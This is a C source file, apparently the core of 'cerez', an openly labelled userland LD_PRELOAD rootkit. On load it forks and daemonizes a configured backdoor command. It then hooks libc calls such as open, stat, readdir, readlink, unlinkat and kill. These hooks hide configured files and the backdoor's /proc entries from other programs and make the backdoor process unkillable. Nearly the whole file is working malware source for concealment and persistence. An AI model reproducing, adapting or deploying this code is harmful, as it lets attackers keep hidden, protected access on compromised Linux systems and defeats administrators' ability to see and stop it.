// clang-format off

/*

 * cerez | simple userland LD_PRELOAD rootkit
 * written by ngn (https://ngn.tf) (2024)

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

// clang-format on

#define _GNU_SOURCE

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <libconfig.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/vfs.h>
#include <sys/wait.h>
#include <unistd.h>

#include "backdoor.h"
#include "config.h"
#include "util.h"

static int (*oopen)(const char *, int, ...);
static int (*oopen64)(const char *, int, ...);
static int (*oopenat)(int, const char *, int, ...);
static int (*oopenat64)(int, const char *, int, ...);
static FILE *(*ofopen)(const char *, const char *);
static int (*okill)(pid_t, int);
static struct dirent *(*oreaddir)(DIR *);
static ssize_t (*oreadlink)(const char *, char *, size_t);
static int (*ounlinkat)(int, const char *, int);
static int (*ostat)(const char *restrict, struct stat *restrict);
static int (*ostatx)(int, const char *restrict, int, unsigned int, struct statx *restrict);
static int (*oaccess)(const char *, int);
static int (*ofstatat)(int, const char *restrict, struct stat *restrict, int);
static int (*ofaccessat)(int, const char *, int, int);
static void (*oexit)(int);

struct original_map {
  void **func;
  char  *name;
};

struct original_map omap[] = {
    {.func = (void **)&oexit,      .name = "exit"     },
    {.func = (void **)&oopen,      .name = "open"     },
    {.func = (void **)&oopen64,    .name = "open64"   },
    {.func = (void **)&oopenat,    .name = "openat"   },
    {.func = (void **)&oopenat64,  .name = "openat64" },
    {.func = (void **)&ofopen,     .name = "fopen"    },
    {.func = (void **)&okill,      .name = "kill"     },
    {.func = (void **)&oreaddir,   .name = "readdir"  },
    {.func = (void **)&oreadlink,  .name = "readlink" },
    {.func = (void **)&ounlinkat,  .name = "unlinkat" },
    {.func = (void **)&ostat,      .name = "stat"     },
    {.func = (void **)&ostatx,     .name = "statx"    },
    {.func = (void **)&oaccess,    .name = "access"   },
    {.func = (void **)&ofstatat,   .name = "fstatat"  },
    {.func = (void **)&ofaccessat, .name = "faccessat"},
};

backdoor_t backdoor;
cfg_t      config;

void _init() {
  debug("we are preloaded!");

  // init stuff
  cfg_init(&config);
  backdoor_init(&backdoor);

  // get the original hooked calls
  for (uint64_t i = 0; i < sizeof(omap) / sizeof(struct original_map); i++)
    if (NULL == (*omap[i].func = find_addr(omap[i].name)))
      exit(1);

  // read and load the config
  if (!cfg_load(&config) || NULL == config.backdoor)
    return;

  // if the backdoor is defined, then find the backdoor processes
  backdoor_find(&backdoor, config.backdoor);

  // if we have the backdoor process running no need to restart it
  if (backdoor.count > 0)
    return;

  // if we don't lets start a child process to run it
  pid_t pid = fork();

  if (pid == 0) {
    // change dir to root dir, and redirect IO to /dev/null
    daemon(0, 0);

    char  *argv[] = {config.shell, "-c", config.backdoor, NULL};
    char **envp = NULL, **cur = environ;
    int    len = 0, null = 0;

    for (; *cur != NULL; cur++) {
      if (strstr(*cur, "LD_PRELOAD=") != NULL)
        continue;

      if (envp == NULL)
        envp = malloc(sizeof(char *) * (++len));
      else
        envp = realloc(envp, sizeof(char *) * (++len));

      envp[len - 1] = *cur;
    }

    if (envp == NULL)
      envp = malloc(sizeof(char *) * (++len));
    else
      envp = realloc(envp, sizeof(char *) * (++len));

    envp[len - 1] = NULL;

    // execute the backdoor with the shell
    execve(config.shell, argv, envp);

    // we should never get here
    exit(0);
  }

  waitpid(pid, NULL, 0);                     // wait for daemonization
  backdoor_find(&backdoor, config.backdoor); // call find again to find the newly created backdoor process
}

bool path_check(const char *path) {
  // if no config then we fine
  if (!config.ok || NULL == path)
    return true;

  // check if its a hidden file
  uint64_t i = 0;

  for (i = 0; i < config.hc; i++) {
    if (strstr(path, config.hidden[i]) != NULL && strstr(path, "." UNIQ) == NULL) {
      debug("check failed for \"%s\": hidden file", path);
      return false;
    }
  }

  // we can skip the process check if the path is not in a procfs
  struct statfs st;

  if (statfs(path, &st) == 0) {
    if (st.f_type != 0x9fa0)
      goto skip_proc;
  }

  // check if its a backdoor process file
  uint64_t pid_size = 0;

  for (i = 0; backdoor.loaded && i < backdoor.count; i++) {
    pid_size = digit_count(backdoor.pids[i]);
    char pid_str[pid_size + 1];
    pid_str[0] = 0;

    snprintf(pid_str, pid_size + 1, "%d", backdoor.pids[i]);

    if (strstr(path, pid_str) != NULL) {
      debug("check failed for \"%s\": process file", path);
      return false;
    }
  }

skip_proc:
  return true;
}

// malicious syscalls

#define am_i_backdoor() backdoor_contains(&backdoor, getpid())
#define make_fake_path(p)                                                                                              \
  char fake_path[strlen(p) + 16];                                                                                      \
  sprintf(fake_path, "%s." UNIQ, p);                                                                                   \
  pathname = fake_path

int access(const char *pathname, int mode) {
  debug("access called!");

  if (am_i_backdoor() || path_check(pathname))
    return oaccess(pathname, mode);

  make_fake_path(pathname);
  return oaccess(pathname, mode);
}

int fstatat(int dirfd, const char *restrict pathname, struct stat *restrict statbuf, int flags) {
  debug("fstatat called!");

  if (am_i_backdoor() || path_check(pathname))
    return ofstatat(dirfd, pathname, statbuf, flags);

  make_fake_path(pathname);
  return ofstatat(dirfd, pathname, statbuf, flags);
}

int stat(const char *restrict pathname, struct stat *restrict statbuf) {
  debug("stat called!");

  if (am_i_backdoor() || path_check(pathname))
    return ostat(pathname, statbuf);

  make_fake_path(pathname);
  return ostat(pathname, statbuf);
}

int statx(int dirfd, const char *restrict pathname, int flags, unsigned int mask, struct statx *restrict statxbuf) {
  debug("statx called!");

  if (am_i_backdoor() || path_check(pathname))
    return ostatx(dirfd, pathname, flags, mask, statxbuf);

  make_fake_path(pathname);
  return ostatx(dirfd, pathname, flags, mask, statxbuf);
}

struct dirent *readdir(DIR *dirp) {
  debug("readdir called!");

  if (am_i_backdoor())
    return oreaddir(dirp);

  struct dirent *dp = oreaddir(dirp);
  while (dp != NULL && (!path_check(dp->d_name))) {
    dp = oreaddir(dirp);
  }

  if (NULL != dp)
    strremove(dp->d_name, "." UNIQ);

  return dp;
}

ssize_t readlink(const char *restrict pathname, char *restrict buf, size_t bufsiz) {
  debug("readlink called!");

  if (am_i_backdoor() || path_check(pathname))
    return oreadlink(pathname, buf, bufsiz);

  make_fake_path(pathname);
  return oreadlink(pathname, buf, bufsiz);
}

FILE *fopen64(const char *restrict pathname, const char *restrict mode) {
  debug("fopen64 called!");

  if (am_i_backdoor() || path_check(pathname))
    return ofopen(pathname, mode);

  make_fake_path(pathname);
  return ofopen(pathname, mode);
}

int open(const char *pathname, int flags, ...) {
  debug("open called!");

  va_list modes;
  va_start(modes, flags);
  int mode = va_arg(modes, int), res = -1;

  if (am_i_backdoor() || path_check(pathname))
    res = oopen(pathname, flags, mode);
  else {
    make_fake_path(pathname);
    res = oopen(pathname, flags, mode);
  }

  va_end(modes);
  return res;
}

int open64(const char *pathname, int flags, ...) {
  debug("open64 called!");

  va_list modes;
  va_start(modes, flags);
  int mode = va_arg(modes, int), res = -1;

  if (am_i_backdoor() || path_check(pathname))
    res = oopen64(pathname, flags, mode);
  else {
    make_fake_path(pathname);
    res = oopen64(pathname, flags, mode);
  }

  va_end(modes);
  return res;
}

int openat(int dirfd, const char *pathname, int flags, ...) {
  debug("openat called!");

  va_list modes;
  va_start(modes, flags);
  int mode = va_arg(modes, int), res = -1;

  if (am_i_backdoor() || path_check(pathname))
    res = oopenat(dirfd, pathname, flags, mode);
  else {
    make_fake_path(pathname);
    res = oopenat(dirfd, pathname, flags, mode);
  }

  va_end(modes);
  return res;
}

int openat64(int dirfd, const char *pathname, int flags, ...) {
  debug("openat64 called!");

  va_list modes;
  va_start(modes, flags);
  int mode = va_arg(modes, int), res = -1;

  if (am_i_backdoor() || path_check(pathname))
    res = oopenat64(dirfd, pathname, flags, mode);
  else {
    make_fake_path(pathname);
    res = oopenat64(dirfd, pathname, flags, mode);
  }

  va_end(modes);
  return res;
}

int unlinkat(int dirfd, const char *pathname, int flags) {
  debug("unlinkat called!");

  if (am_i_backdoor() || path_check(pathname))
    return ounlinkat(dirfd, pathname, flags);

  make_fake_path(pathname);
  return ounlinkat(dirfd, pathname, flags);
}

int kill(pid_t pid, int sig) {
  debug("kill called!");

  if (backdoor_contains(&backdoor, pid)) {
    errno = ESRCH;
    return -1;
  }

  return okill(pid, sig);
}

int faccessat(int dirfd, const char *pathname, int mode, int flags) {
  debug("faccessat called!");

  if (am_i_backdoor() || path_check(pathname))
    return ofaccessat(dirfd, pathname, mode, flags);

  make_fake_path(pathname);
  return ofaccessat(dirfd, pathname, mode, flags);
}

void exit(int status) {
  debug("exit called!");

  cfg_destroy(&config);
  backdoor_destroy(&backdoor);

  oexit(status);
  abort();
}
